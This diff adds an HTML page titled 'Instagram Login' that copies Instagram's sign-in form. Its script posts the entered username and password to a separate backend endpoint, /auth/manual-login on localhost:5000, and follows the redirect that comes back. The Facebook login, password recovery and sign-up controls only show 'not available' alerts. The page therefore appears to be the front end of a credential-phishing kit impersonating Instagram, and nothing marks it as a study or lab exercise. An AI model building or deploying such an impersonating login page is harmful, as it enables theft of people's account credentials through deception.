@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+    <div class="container">
+      <div class="box">
+        <div class="heading"></div>
+        <form class="login-form" id="loginForm">
+          <div class="field">
+            <input 
+              id="username"
+              type="text"
+              placeholder="Phone number, username, or email"
+            />
+            <label for="username">Phone number, username, or email</label>
+          </div>
+          <div class="field">
+            <input 
+              id="password" 
+              type="password" 
+              placeholder="password"            
+            />
+            <label for="password">Password</label>
+          </div>
+            <button class="login-button" type="submit" title="login">Log In</button>
+            <div class="separator">
+              <div class="line"></div>
+              <p>OR</p>
+              <div class="line"></div>
+            </div>
+          <div class="other">
+            <button 
+              class="fb-login-btn" 
+              type="button"
+              id="fbLoginBtn"
+            >
+              <i class="fa fa-facebook-official fb-icon"></i>
+              <span class="">Log in with Facebook</span>
+            </button>
+            <a class="forgot-password" href="#" id="forgotPassword">Forgot password?</a>
+          </div>
+          
+          <div style="margin-top: 20px; text-align: center; border-top: 1px solid #dbdbdb; padding-top: 20px; width: 100%;">
+            <p style="font-size: 14px; color: #262626;">Don't have an account? <a class="signup" href="#" id="signupLink">Sign Up</a></p>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      const API_URL = 'http://localhost:5000';
+
+      // Handle form submission (Login button)
+      document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+          alert('Please enter both username and password.');
+          return;
+        }
+
+        try {
+          const response = await fetch(`${API_URL}/auth/manual-login`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ username, password })
+          });
+
+          const data = await response.json();
+          
+          if (data.success && data.redirect) {
+            window.location.href = `${API_URL}${data.redirect}`;
+          } else {
+            alert('Login failed: ' + (data.message || 'Unknown error'));
+          }
+        } catch (error) {
+          console.error('Login error:', error);
+          alert('Login failed. Please try again.');
+        }
+      });
+
+      // Disable other buttons when Google Auth is removed
+      document.getElementById('fbLoginBtn').addEventListener('click', () => {
+        alert('Please log in using your username and password.');
+      });
+
+      document.getElementById('forgotPassword').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert('Password recovery is not available.');
+      });
+
+      document.getElementById('signupLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert('Sign up is not available.');
+      });
+    </script>
+</body>
+</html>
